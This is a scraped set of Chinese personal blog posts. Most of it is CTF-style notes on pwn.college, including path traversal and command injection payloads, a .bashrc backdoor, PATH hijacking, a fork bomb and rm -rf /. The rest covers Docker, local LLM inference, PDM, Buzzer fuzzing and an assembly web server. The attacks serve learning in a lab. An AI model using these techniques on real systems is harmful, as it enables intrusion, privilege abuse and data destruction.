HTTP/1.1 Host: challenge.localhost:80 Content-Type: application/x-www-form-urlencoded Content-Length: 64 unlock_code=vbemwqtf\u0026amp;unlock=wxqdlpqz\u0026amp;pin=irdvpzgf\u0026amp;token=eiiddxbd level23-level25 URL 重定向（也称为 URL 转发）是一种为页面、表单或者整个 Web 站点/应用提供多个 URL 地址的技术。HTTP 对此操作有一种特殊类型的响应，称为 HTTP 重定向（HTTP redirect）。\nlevel23使用netcat处理重定向：\n1 2 3 4 5 GET / HTTP/1.1 Host: challenge.localhost:80 GET /uVbqQpyn-fulfill HTTP/1.1 Host: challenge.localhost:80 level24，使用curl进行处理，curl的-L选项，可以自动处理重定位问题：\n1 curl -L -H \u0026#34;Host:challenge.localhost:80\u0026#34; http://127.0.0.1:80/ level25，使用python就更简单了，requests库会自动处理redirect的情况：\n1 2 3 4 5 6 7 8 9 #!/usr/bin/python import requests header = { \u0026#34;Host\u0026#34;:\u0026#34;challenge.localhost:80\u0026#34;, } response=requests.get(\u0026#34;http://127.0.0.1:80/\u0026#34;, headers=header) print(response.content) level26-level28 这几关加入了cookie。\nlevel26:\ncurl的-c可以将cookie保存到一个文件，-b则是指定文件内容作为cookie。\n1 2 curl -c cookies.txt 127.0.0.1 curl -b cookies.txt 127.0.0.1 level27:\n1 2 3 4 nc 127.0.0.1 80 GET / HTTP/1.1 Cookie: cookie=xxx level28:\n1 2 3 4 5 6 7 8 9 10 #!/usr/bin/python import requests header = { \u0026#34;Cookie\u0026#34;: \u0026#34;cookie=x\u0026#34; } response=requests.get(\u0026#34;http://127.0.0.1:80/\u0026#34;, headers=header) print(response.content) level29-level36 level29，这一关使用python requests完成，requests似乎也有针对state的功能，所以代码很简单，仅用requests发送请求即可。\n1 2 3 4 5 #!/usr/bin/python import requests response=requests.get(\u0026#34;http://127.0.0.1:80/\u0026#34;) print(response.content) level30，这一关要求我们对1337端口进行监听，运行/challenge/client客户端以后，会发送带有flag的请求。\n1 nc -l 1337 level31，在server端进行一个重定向。\n1 2 3 4 5 6 7 8 9 10 11 import flask import os app = flask.Flask(__name__) @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def redirector(): return flask.redirect(f\u0026#34;http://challenge.localhost:80/attempt\u0026#34;) app.secret_key = os.urandom(8) app.run(\u0026#34;localhost\u0026#34;, 1337) Web Security - Intro to Cybersecurity Path Traversal 1-2 这两关与路径相关，我们在request中加入../即可挣脱出server设置的路径限制，对任意其他文件进行访问。\nlevel1:\n1 2 curl http://challenge.localhost:80/blob/..%2F..%2Fflag curl --path-as-is http://challenge.localhost:80/blob/../../flag 如果我们直接运行curl http://challenge.localhost:80/blob/../../flag，路径最终会被解析为/flag，会出现这个问题的原因是curl会对路径进行简化，将../合并，因此我们可以通过将字符转为编码以解决此问题。此外，我们也可以用curl的flag --path-as-is 解决此问题。\nlevel2：\n1 curl -v http://challenge.localhost:80/data/fortunes/..%2F..%2F..%2Fflag 从level2的server源码requested_path = app.root_path + \u0026quot;/files/\u0026quot; + path.strip(\u0026quot;/.\u0026quot;)可以观察到，相较于level1，level2将path首尾的 . 和 \\ 字符删去了，我们只需要在路径首部加上一个存在的文件夹即可绕过。根据观察，在/challenge/files路径下存在一个fortunes文件夹，我们可以借此绕过检查。\nCMDi 1-6 CMDi 1\n利用server代码执行命令，简单用;分隔不同的命令。\n1 2 3 4 5 6 7 import requests arg=\u0026#34;; cat /flag\u0026#34; response = requests.get(f\u0026#34;http://challenge.localhost:80/puzzle?topdir={arg}\u0026#34;) print(response.request) print(response.content) ","date":"2025-06-30T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/hello-pwn-web/","title":"pwn.college web"},{"content":"清理var目录 清理过程 今天运行我的主机的时候突然提示var目录占满了，使用df -h查看，19G空间都被占满了。\n随机我准备对var目录进行清理，到目录下查看存储量占用时，却发现当前的文件根本没有占用那么多空间。\n按理来说还有十几G的空间才对。\n查阅资料发现当进程打开了某个文件时，只要该进程保持打开该文件，即使将其删除，它依然存在于磁盘中。这意味着，进程并不知道文件已经被删除，它仍然可以向打开该文件时提供给它的文件描述符进行读取和写入。这个文件仅对该进程可见，对其他进程不可见，因为已经删除了其相应的目录索引节点。这也就是存在着幽灵文件占用/var目录磁盘空间的原因。\n我使用命令lsof | grep delete查看是否有进程在占用已经删除了的文件，发现果然如此。\n将这些进程kill之后，磁盘空间果然得到了释放。\n参考 https://blog.csdn.net/ithomer/article/details/8649706\n","date":"2025-06-16T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/clean-var/","title":"var目录清理"},{"content":"Docker使用 第一次接触Docker，是在本科做seed lab实验的时候，迄今仍与我的学习科研紧密相关。不过过了这么久，也没有将我的一些使用心得记录下来，今天在这里开个帖子，记录一些Docker的基础用法，也借机探讨一下更深层次的技术与知识。\n","date":"2025-06-11T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/hello-docker/","title":"Docker的用法"},{"content":"本地大模型调用 最近用Lora微调了一个小模型，生成一些小程序，记录一下我是怎么在本地部署使用的。\n实验环境 A800 80G GPU Qwen3 1.7b\n使用模型进行推理 大模型部署好以后，怎么调用大模型进行推理工作呢？整个流程可以分为4步：\n初始化 构建输入 大模型生成 解析输出 初始化 在这一步，我们将加载本地大模型和分词器，使用Hugging Face的from_pretrained函数。\n1 2 3 4 5 6 model = AutoModelForCausalLM.from_pretrained( \u0026#34;./Qwen\u0026#34;, device_map=\u0026#34;auto\u0026#34;, trust_remote_code=True, ) tokenizer = AutoTokenizer.from_pretrained(\u0026#34;./Qwen\u0026#34;) 构建输入 在这一步，我们构建prompt作为输入，首先构造一个基础的消息文本。\n1 2 3 4 messages = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: f\u0026#34;{prompt}\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: f\u0026#34;{prompt_u}\u0026#34;} ] 然后用分词器构造template，将文字文本转化为大模型可以处理的输入格式。\n1 2 3 4 5 6 7 8 text = tokenizer.apply_chat_template( messages, tokenize=False, add_generation_prompt=True, enable_thinking=False ) model_inputs = tokenizer([text], return_tensors=\u0026#34;pt\u0026#34;).to(device) 看看model_inputs直接打印出来输出的内容。\n可以看到分词器将文字转化为了模型可理解的数字序列，每个数字对应分词器词汇表中的一个词/子词。\ntokenize=False参数会让函数以文本的形式输出结果，否则将以id的形式输出结果。\nadd_generation_prompt=True会在输出的结果中增加一个assistant的操作，这里我们将text以文本的形式打印出来看看。 enable_thinking则是决定是否要启动大模型的思考模式，启动以后会延长思考时间，这里我直接关闭了。\n使用模型进行推理 这一步，我们将上一步得到的输入传递给大模型进行推理，得到推理结果。\n1 2 3 4 5 generated_ids = model.generate( model_inputs.input_ids, max_new_tokens=MAX_LENGTH, temperature=1.0, ) 这里输出的generated_ids也是以id的形式展现的，要使用tokenizer将其转换为自认语言。\n解析输出 这一步，我们将大模型的输出解码，转为自然语言。\n1 2 3 4 5 generated_ids = [ output_ids[len(input_ids):] for input_ids, output_ids in zip(model_inputs.input_ids, generated_ids) ] response = tokenizer.batch_decode(generated_ids, skip_special_tokens=True)[0] 推理加速 跑着跑着，我就发现一些不对劲了，怎么生成速率这么慢？我统计了大模型进行10次推理任务所需的时间，生成一个1500 token长度的程序得花上37s，这对吗？\n这不对，要知道我用的是个小模型，结果速度还不如网页大模型。\n后面找到了一些加速的方法，请容我细细道来。\n增大 batch size 简单来说就是在tokenizer中添加多个请求内容，让大模型同时处理，生成多个response。最大化GPU计算单元利用率​。这个过程很像并发。\n使用多个GPU 这自然就没什么好说的。\n完整程序代码 初始版本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 from transformers import AutoModelForCausalLM, AutoTokenizer, BitsAndBytesConfig from peft import LoraConfig, get_peft_model, PeftModel import torch import random import time model = AutoModelForCausalLM.from_pretrained( \u0026#34;./Qwen\u0026#34;, device_map=\u0026#34;auto\u0026#34;, trust_remote_code=True, ) peft_config = LoraConfig( task_type=\u0026#34;CAUSAL_LM\u0026#34;, inference_mode=False, r=8, lora_alpha=32, lora_dropout=0.1, target_modules=[\u0026#34;q_proj\u0026#34;, \u0026#34;v_proj\u0026#34;] ) model = PeftModel.from_pretrained(model, \u0026#34;lora_adapter10-30\u0026#34;) print(\u0026#34;load peft\u0026#34;) tokenizer = AutoTokenizer.from_pretrained(\u0026#34;./Qwen\u0026#34;) prompt = \u0026#34;your system prompt\u0026#34; prompt_u = \u0026#34;your user prompt\u0026#34; MAX_LENGTH=1500 def predict(messages, model, tokenizer): device = \u0026#34;cuda\u0026#34; text = tokenizer.apply_chat_template( messages, tokenize=False, add_generation_prompt=True, enable_thinking=False ) model_inputs = tokenizer([text], return_tensors=\u0026#34;pt\u0026#34;).to(device) attention_mask = torch.ones(model_inputs.input_ids.shape,dtype=torch.long,device=\u0026#34;cuda\u0026#34;) generated_ids = model.generate( model_inputs.input_ids, attention_mask=attention_mask, max_new_tokens=MAX_LENGTH, temperature=1.0, ) generated_ids = [ output_ids[len(input_ids):] for input_ids, output_ids in zip(model_inputs.input_ids, generated_ids) ] response = tokenizer.batch_decode(generated_ids, skip_special_tokens=True)[0] return response save_dir=\u0026#34;./seeds/\u0026#34; total=0 for i in range(10): start_time=time.time() messages = [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: f\u0026#34;{prompt}\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: f\u0026#34;{prompt_u.format(num=random.randint(5, 40))}\u0026#34;} ] response = predict(messages, model, tokenizer) end_time=time.time() total += end_time - start_time print(f\u0026#34;Generation time: {end_time - start_time:.2f} seconds\u0026#34;) response_text = f\u0026#34;\u0026#34;\u0026#34; LLM:{response} \u0026#34;\u0026#34;\u0026#34; print(response_text) file=f\u0026#34;{save_dir}seed_{i}.txt\u0026#34; with open(file, \u0026#34;w\u0026#34;) as f: f.write(response) print(f\u0026#34;average generation time: {total/10:.2f} seconds\u0026#34;) 参考 ","date":"2025-06-10T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/hello-local-llm-predict/","title":"调用本地大模型进行predict"},{"content":"PDM使用 PDM是一个python包管理器，不过它不是一个虚拟环境，它可以将依赖安装到项目本地的__pypackages__目录，而非全局目录，从而避免污染全局环境并且实现项目隔离。\n在PDM环境下，项目将优先从__pypackages__中搜索包，实现的原理就是在全局的 site-packages 目录之前加上项目目录里的__pypackages__路径，使得__pypackages__的搜索优先级高于全局的 Python 环境。\n目前我只写了一些初级的用法，后面我会随着我的深入使用更新我的博客。\n下载与安装 使用pip下载，可能会出先网络连接不成功，下载失败的情况，这种情况指定国内源即可：\n1 2 pip install pdm pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pdm 使用 pdm install速度慢处理 指定pdm使用国内源：\n1 2 pdm config pypi.url https://pypi.tuna.tsinghua.edu.cn/simple 创建项目 创建项目的时候会让依次输入使用的python解释器版本、项目名、邮件等等信息，一板一眼确实挺不错的。\n1 2 mkdir my-project \u0026amp;\u0026amp; cd my-project pdm init init成功以后会在目录下创建下面的三个文件：\n.pdm-python\n.pdm-python中存放了python解释器的路径\npdm.lock\n所有软件包及其版本 包的文件名和哈希值 用于下载包的源 URL 每个包的依赖项和标记 1 2 3 4 5 6 7 8 9 10 11 # This file is @generated by PDM. # It is not intended for manual editing. [metadata] groups = [\u0026#34;default\u0026#34;] strategy = [\u0026#34;inherit_metadata\u0026#34;] lock_version = \u0026#34;4.5.0\u0026#34; content_hash = \u0026#34;sha256:5e86f537f04c413e1ae880b74cc0ddbde0cac75b48683e80298d9a986d7e06c5\u0026#34; [[metadata.targets]] requires_python = \u0026#34;==3.12.*\u0026#34; pyproject.toml\npyproject.toml中则存放了一些相关信息。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 [project] name = \u0026#34;test\u0026#34; version = \u0026#34;0.1.0\u0026#34; description = \u0026#34;Default template for PDM package\u0026#34; authors = [ {name = \u0026#34;apowerfulmei\u0026#34;,email = \u0026#34;1234@qq.com\u0026#34;}, ] dependencies = [] requires-python = \u0026#34;==3.12.*\u0026#34; readme = \u0026#34;README.md\u0026#34; license = {text = \u0026#34;MIT\u0026#34;} [tool.pdm] distribution = false 依赖项管理 增加依赖项 1 2 3 4 5 6 7 pdm add packages/localpath/url pdm add pandas pdm add pandas==2.2.2 pdm add ./package pdm add \u0026#34;https://github.com/numpy/numpy/releases/download/v1.20.0/numpy-1.20.0.tar.gz\u0026#34; pdm add \u0026#34;git+https://github.com/pypa/pip.git@22.0\u0026#34; add的参数可以是包的名称，可以是本地包的路径（本地路径要以./开头，否则会被视为普通包的命名），可以是URL，也可以是VCS 依赖项。\n增加依赖项的时候指定版本或许会是个好习惯。\n移除依赖项 1 pdm remove pandas 更新依赖项 1 pdm update package 将依赖项更新到更新的版本。\n配置项目 更改pdm配置 1 pdm config 下载依赖并使用pdm环境 1 pdm install 执行命令，pdm将下载pyproject.toml中的依赖项。\n此外，配置环境的方法有两种，分别是虚拟环境和PEP 582环境：\n虚拟环境下将创建一个.venv目录，目录中存放了下载的各种依赖包，可执行以下命令进行操作：\n1 2 3 4 5 # 列举虚拟环境下的依赖项 pdm venv list # 激活虚拟环境，test为项目名称 eval $(pdm venv activate for-test) PEP 582环境将创建一个__pypackages__目录，目录下存放各种依赖包。在PEP 582环境下执行python命令如下：\n1 pdm run python3 test.py pdm run会做两件事：1、在执行命令前，插入 __pypackages__ 目录到 PYTHONPATH 中；2、在执行命令后，删除 PYTHONPATH 中的 __pypackages__ 目录。\n一些方便的方法 配置已有项目 有时候我们会在创建了一个包含大量包的python项目后才想起来使用pdm进行包管理，这种情况应该怎么做呢？\n可以先用pigar生成一个requirements.txt文件：\n1 2 pip install pigar pigar gen 然后直接import即可。\n1 pdm import -f requirements ./requirements.txt 不过实践证明pigar创建的requirements所包含的依赖不一定齐全。\n参考 https://pdm-project.org/zh-cn/latest/ https://geekdaxue.co/read/yumingmin@python/mi4af1 https://blog.csdn.net/penntime/article/details/140191708 https://www.cnblogs.com/liwenchao1995/p/17421496.html https://zhuanlan.zhihu.com/p/492331707\n","date":"2025-05-30T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/hello-pdm/","title":"pdm的用法"},{"content":"Buzzer复现 1、环境搭建 1.1 依赖与工具 bazel\nclang安装 我使用的是llvm-10\n1 2 3 4 5 6 7 8 # bazel sudo apt install apt-transport-https curl gnupg -y curl -fsSL https://bazel.build/bazel-release.pub.gpg | gpg --dearmor \u0026gt;bazel-archive-keyring.gpg sudo mv bazel-archive-keyring.gpg /usr/share/keyrings echo \u0026#34;deb [arch=amd64 signed-by=/usr/share/keyrings/bazel-archive-keyring.gpg] https://storage.googleapis.com/bazel-apt stable jdk1.8\u0026#34; | sudo tee /etc/apt/sources.list.d/bazel.list sudo apt update \u0026amp;\u0026amp; sudo apt install bazel sudo apt update \u0026amp;\u0026amp; sudo apt full-upgrade 设置环境变量，设置clang和clang++的路径\n1 2 export CC=clang export CXX=clang++ 运行，使用bazel构建buzzer\n1 2 3 git clone https://github.com/google/buzzer.git cd buzzer bazel build :buzzer build过程中可能会遭遇问题一，需要使用低版本的bazel才可顺利完成build\n2、run Buzzer with coverage https://github.com/google/buzzer/blob/main/docs/guides/running_with_coverage.md\n2.1 准备 bullseye.img准备\nlinux kernel准备\n注意：CONFIG_BPF=y and CONFIG_BPF_SYSCALL=y\n2.2 qemu vm运行 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 qemu-system-x86_64 \\ -m 20G \\ -smp 2 \\ -cpu host \\ -kernel PATH_TO_KERNEL_REPO/arch/x86/boot/bzImage \\ -append \u0026#34;console=ttyS0 root=/dev/sda nokaslr earlyprintk=serial net.ifnames=0\u0026#34; \\ -drive file=PATH_TO_DEBIAN_IMAGE/bullseye.img,format=raw \\ -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10022-:22,hostfwd=tcp:0.0.0.0:8080-:8080 \\ -net nic,model=e1000 \\ -enable-kvm \\ -nographic \\ -pidfile vm.pid \\ 2\u0026gt;\u0026amp;1 | tee vm.log # my cmd qemu-system-x86_64 \\ -m 20G \\ -smp 2 \\ -cpu host \\ -kernel ./kernel/arch/x86/boot/bzImage \\ -append \u0026#34;console=ttyS0 root=/dev/sda nokaslr earlyprintk=serial net.ifnames=0\u0026#34; \\ -drive file=/home/ranma/image/stretch.img,format=raw \\ -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10022-:22,hostfwd=tcp:0.0.0.0:8080-:8080 \\ -net nic,model=e1000 \\ -enable-kvm \\ -nographic \\ -pidfile vm.pid \\ 2\u0026gt;\u0026amp;1 | tee vm.log 运行成功：\n2.3 材料准备 向vm中传输一些必要文件，以及必要的准备\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # 传输vmlinux scp -i PATH_TO_DEBIAN_IMAGE/bullseye.id_rsa -P 10022 PATH_TO_KERNEL_REPO/vmlinux root@localhost:~/ # 创建目录 mkdir /root/sourceFiles # 传输verifier.c文件 scp -i PATH_TO_DEBIAN_IMAGE/bullseye.id_rsa -P 10022 PATH_TO_KERNEL_REPO/kernel/bpf/verifier.c root@localhost:~/sourceFiles # 传输buzzer scp -i PATH_TO_DEBIAN_IMAGE/bullseye.id_rsa -P 10022 PATH_TO_BUZZER root@localhost:~/ # my cmd scp -i ./image/bullseye.id_rsa -P 10022 ./kernel/vmlinux root@localhost:~/ scp -i ./image/bullseye.id_rsa -P 10022 ./kernel/kernel/bpf/verifier.c root@localhost:~/sourceFiles scp -i ./image/bullseye.id_rsa -P 10022 /home/ranma/eBPF/buzzer/bazel-bin/buzzer_/buzzer root@localhost:~/ 2.4 Buzzer运行 1 2 ./buzzer -strategy=pointer_arithmetic # 直接运行./buzzer默认使用playground策略，没什么实际效果 运行效果：\n报错 错误1 看上去似乎是bazel版本过高带来的问题，安装低版本的7.4.0 bazel即可解决\n1 2 sudo apt install bazel-7.4.0 sudo ln -s /usr/bin/bazel-7.4.0 /usr/bin/bazel 错误2 传输文件vmlinux遇到qemu空间不足\n使用create-image.sh创建一个/root空间更大的image，修改SEEK参数，这里改为4G\n错误3 运行./buzzer之后没有反应\nhttps://github.com/google/buzzer/issues/58\n","date":"2025-05-29T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/buzzer/","title":"Buzzer Fuzz"},{"content":"Lora 原理 冻结原始矩阵，在原始矩阵的基础上添加一个低秩矩阵。\n微调流程 微调后的大模型使用 参考 ","date":"2025-05-29T00:00:00Z","permalink":"https://apowerfulmei.github.io/p/hello-lora/","title":"Lora fine-tuning"},{"content":"PWN Getting Started 1、Linux Luminarium Practicing Piping Level8 grepping errors 知识点：\n1 2 3 4 5 6 7 8 9 # 通过2\u0026gt;$ 1的方式将error输出到标准输出 /challenge/run 2\u0026gt;\u0026amp;1 | grep pwn #注意是\u0026amp;符号而不是$ # grep的用法 grep [pattern] [filepath] grep X ./x.txt Level9 duplicating piped data with tee 知识点：\ntee命令的作用：tee命令可以将标准输入的内容导入到标准输出以及多个文件中\n1 /challenge/pwn | tee hint.txt | /challenge/college 随后按照提示的用法，将pwn命令的输出导入给college即可得到flag\nLevel11 split piping stderr and stdout 1 2 3 /challenge/hack 2\u0026gt; \u0026gt;(/challenge/the) | /challenge/planet /challenge/hack 2\u0026gt; \u0026gt;(/challenge/the) \u0026gt; \u0026gt;(/challenge/planet) /challenge/hack 2\u0026gt; \u0026gt;(/challenge/the) 1\u0026gt; \u0026gt;(/challenge/planet) 分流输出stderr与stdout。\n2\u0026gt; \u0026gt;(...)：将 stderr（文件描述符 2）重定向到一个子shell，子shell 中运行 /challenge/the 命令。 \u0026gt; \u0026gt;(...)：将 stdout（文件描述符 1）重定向到一个子shell，子shell 中运行 /challenge/planet 命令。 \u0026gt; \u0026gt;() 和| 的区别\n\u0026gt; \u0026gt;()： 会创建子shell 来处理重定向，可能会稍微影响性能，但在大多数情况下差异不大。 适用于需要灵活处理多个输出流的复杂场景。 |： 直接在当前 shell 中处理，性能较高。 适用于简单的命令链式调用。 Data Manipulation 这一章的关卡也挺简单的，首先是命令tr的使用方法，总结一些必要的知识点。\n1 2 3 4 5 6 7 8 9 10 # 1、替换字符串，将字符串中的abc替换为ABC，第一关就是交换一下大小写 tr abc ABC /challenge/run | tr ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ # 2、删除字符，使用-d标签 tr -d %^ /challenge/run | tr -d ^% # 3、删除特殊字符\\n，这一关提到了一个知识点，\\字符要用\\\\表示 /challenge/run | tr -d \u0026#34;\\n\u0026#34; 然后是head的使用，这些命令虽然简单，但是遗忘掉用法也很容易，还是得记录一下。\n1 2 # 4、使用head -n num输出前num行的内容 /challenge/pwn | head -n 7 | /challenge/college 最后是命令cut的使用。这条命令简单来说就是从列提取内容。\n1 2 # 5、cut的-d参数用于指出分隔符，-f则指出具体提取哪一列的内容 /challenge/run | cut -d \u0026#34; \u0026#34; -f 2 | tr -d \u0026#34;\\n\u0026#34; Shell Variables 这一部分的关卡都很简单\n总结一部分知识点\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 设置变量，这样设置的变量仅对当前shell可见 VAR=value # 使用export设置变量，这样设置的变量对当前shell及其子shell都可见 export VAR=value # 可以使用echo和env查看设置的变量 echo $VAR env # 使用$()获取命令的输出 VAR = $(cat file) # 使用read读取输入 read VAR # 使用read读取文件 read VAR \u0026lt; file Processes and Jobs 知识点总结\n1 2 3 4 5 Ctrl+Z 暂停 fg 启用并转到foreground bg 启用并转到background 运行一条命令后，可以使用 echo $? 查看exit code Perceiving Permissions 1 2 3 4 5 chown 改变文件归属 chgrp 改变文件归属组 chmod u/g/o/a +/-/= rwx [file] chmod u/g/o/a=- [file]直接清除权限 chmod u+s [file] 让其他用户以该文件的owner权限接触该文件 Silly Shenanigans 1、Bashrc Backdoor\n.bashrc中的命令会在启动时被执行，可以用作一些恶意行为。\n2、Sniffing Input\n这一关的通关思路是修改/home/zardus/.bashrc，在其目录下创建一个flag_checker，将该脚本的路径加入到PATH，使zardus执行flag_checker时执行的是该目录下的脚本，读取并打印flag。\n修改.bashrc如下：\n3、Overshared Directories\n这一关用我上一关的方法也可以成功读取flag。\n4、Trikey Linking\n这一关，zardus会向/tmp/collab/evil-commnands.txt中写入读取flag的命令，我们可以建立一个evil-commands.txt到.bashrc的链接，让zardus将命令写入.bashrc，从而读取flag。\n1 2 3 4 rm /tmp/collab/evil-commands.txt ln /home/zardus/.bashrc /tmp/collab/evil-commands.txt /challenge/victim /challenge/victim 5、Sniffing Process Arguments\n这一关很简单，通过ps -aux查看zardus的进程及其涉及到的密码，登录并读取flag。\n6、Snooping on configurations\n这一关也很简单，它主要就是为了告诉我们用户的.bashrc对于其他用户是默认可读的。我们通过查看.bashrc获取key就可以。\nDaring Destruction 1、The Fork Bomb\n这一关编写一个脚本，不停地执行fork操作，直到系统资源被耗尽。\n1 2 3 import os while True: os.system(\u0026#34;python3 test.py \u0026amp;\u0026#34;) 1 2 /challenge/check python3 test.py 不过这一关让我比较好奇的是，如果仅仅是执行python3 test.py，系统资源并不会被耗尽，而python3 test.py \u0026amp;这种background进程，则会很快消耗掉资源，这是为什么？\n原因也很简单，加上了\u0026amp;之后，进程会变为非阻塞式，程序会不断运行，而去掉之后，则会等待命令执行完毕之后再执行后面的命令，因为不会带来很大的开销。\n2、Disk-Space DoomsDay\n1 2 3 4 yes \u0026gt; ./x.txt /challenge/check rm ./x.txt /challengr/check 3、rm -rf /\n阅读/challenge/check： 当根目录下的文件被删到一定程度时就会打印flag内容。\n这一关开启两个terminal，一个执行/challenge/check，另一个执行rm -rf --no-preserve-root /，等待一段时间后，check就会打印flag。\n4、Life after rm -rf /\n这一关和上一关类似，但是/challenge/check不会直接打印/flag，而是在检测到条件满足后，将flag的值再次保存到新的/flag中。\n然而使用了rm -rf /之后，cat已经无法使用，这时候只能使用buildin内置命令，比如使用read读取文件。\n1 2 read x \u0026lt; /flag $x 5、Finding meaning after rm -rf /\n这一关和上一关的不同之处在于，flag会被保存为一个随机的名称，然而ls命令此时已经不可用，我们可以用echo读取出文件名。\n1 echo /* 2、computing 101 Your first program 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # 这一部分主要讲述了汇编代码的编写应用 汇编程序保存至.s文件中 使用syscall进行系统调用，系统调用编码保存在rax中 如： mov rax, 60 syscall 调用60号系统调用exit 使用寄存器进行传参，如exit的参数保存在rdi中 mov rdi, 42 mov rax, 60 syscall # 编译为可执行文件 编译前在文件头部加上 .intel_syntax noprefix 告知使用的是Intel汇编编码格式 as -o asm.o assemble.s ld -o exe asm.o # write syscall syscall 编号为1 三个参数 rdi 要写入的文件描述符 rsi 字符串起始地址 rdx 字符串长度 Debugging Refresher set disassembly-flavor intel 设置为intel格式\nlevel8\nwin+12 +20 +24 +33处，[rax]指向的地址为0，为nullptr，会引发segmentation fault\n因而此处直接跳过错误代码，跳转到win+35进行后续操作即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 0x580e06449951 \u0026lt;win\u0026gt;: endbr64 0x580e06449955 \u0026lt;win+4\u0026gt;: push rbp 0x580e06449956 \u0026lt;win+5\u0026gt;: mov rbp,rsp 0x580e06449959 \u0026lt;win+8\u0026gt;: sub rsp,0x10 0x580e0644995d \u0026lt;win+12\u0026gt;: mov QWORD PTR [rbp-0x8],0x0 0x580e06449965 \u0026lt;win+20\u0026gt;: mov rax,QWORD PTR [rbp-0x8] 0x580e06449969 \u0026lt;win+24\u0026gt;: mov eax,DWORD PTR [rax] 0x580e0644996b \u0026lt;win+26\u0026gt;: lea edx,[rax+0x1] 0x580e0644996e \u0026lt;win+29\u0026gt;: mov rax,QWORD PTR [rbp-0x8] 0x580e06449972 \u0026lt;win+33\u0026gt;: mov DWORD PTR [rax],edx 0x580e06449974 \u0026lt;win+35\u0026gt;: lea rdi,[rip+0x73e] # 0x580e0644a0b9 0x580e0644997b \u0026lt;win+42\u0026gt;: call 0x580e06449180 \u0026lt;puts@plt\u0026gt; 0x580e06449980 \u0026lt;win+47\u0026gt;: mov esi,0x0 0x580e06449985 \u0026lt;win+52\u0026gt;: lea rdi,[rip+0x749] # 0x580e0644a0d5 0x580e0644998c \u0026lt;win+59\u0026gt;: mov eax,0x0 0x580e06449991 \u0026lt;win+64\u0026gt;: call 0x580e06449240 \u0026lt;open@plt\u0026gt; jump *win+35 c Building a Web Server 正好借这一部分复习一下汇编的知识。这一章一方面是要经常查表，查看各个系统调用的用法，另一方面就是考察一些程序设计基本功。题目要求写一个处理GET请求和POST请求的汇编程序。\nPART1 创建socket，以及执行listen，bind等系统调用，完成一个初始化。调用bind的时需要在栈内构建一个结构体sockaddr。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 mov rdi, 2 mov rsi, 1 mov rdx, 0 mov rax, 41 # create socket syscall mov qword ptr [rsp - 24], rax mov qword ptr [rsp - 24], 0 # fd mov word ptr [rsp - 16], 2 # AF_INET (2 bytes) mov word ptr [rsp - 14], 0x5000 # Port 80 (network byte order: 0x5000) mov dword ptr [rsp - 12], 0x0000000 # 0.0.0.0 (network byte order: 0x7F000001) mov qword ptr [rsp - 8], 0 # sin_zero (8 bytes padding mov rdi, [rsp - 24] # fd lea rsi, [rsp-16] mov rdx, 16 mov rax, 49 # bind syscall mov rdi, [rsp - 24] # fd mov rsi, 0 mov rax, 50 # listen syscall PART2 接收request并创建response，使用accept获取request，从中读出要处理的文件名，将本地的文件内容write到相关的fd中。 这里我简单粗暴在栈上开辟了一个超大的空间用于保存request的内容，然后从头遍历，把文件名的后一个byte写为\\0，再把指向文件名的地址传送给系统调用open即可。accept会返回一个套接字文件描述符，往里面write文件内容即可。\nPART3 对于每一个请求，使用子进程进行处理。\n这里涉及到系统调用fork的用法。调用之后，父子进程都将从当前程序的位置往后执行，且父子进程不共享栈空间。在fork后要加一个判断逻辑，根据fork的返回值判断当前进程是父进程还是子进程，返回值为0则是子进程，否则为父进程。对于父进程，程序进入循环，接收下一个请求，对于子进程，程序处理现在的这个请求。\nPART4 处理POST请求。POST请求的内容包括要写入的文件名，要写入的内容以及长度。文件头Content-Length会说明要写入内容的长度。\n这里要处理两部分的内容，第一是匹配该文件头，第二是读取文件长度。下面的代码是我的处理逻辑。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 # 获取length所处的位置 mov rdi, 0 mov rsi, 0 mov rcx, 0 mov rax, 15 xxx: mov cl, byte ptr [rsp-924+rdi] cmp cl, byte ptr [length+rsi] je xx add rdi, 1 mov rsi, 0 jmp xxx xx: add rdi, 1 add rsi, 1 cmp rsi,rax jne xxx # 计算length mov rax, 0 mov rcx, 0 add rdi, 1 xxxx: # 一个字节一个字节读，计算长度 # 如123等于 ((\u0026#39;1\u0026#39;-\u0026#39;0\u0026#39;)*10+(\u0026#39;2\u0026#39;-\u0026#39;0\u0026#39;))*10+(\u0026#39;3\u0026#39;-\u0026#39;0\u0026#39;) imul eax, 10 mov cl, byte ptr [rsp - 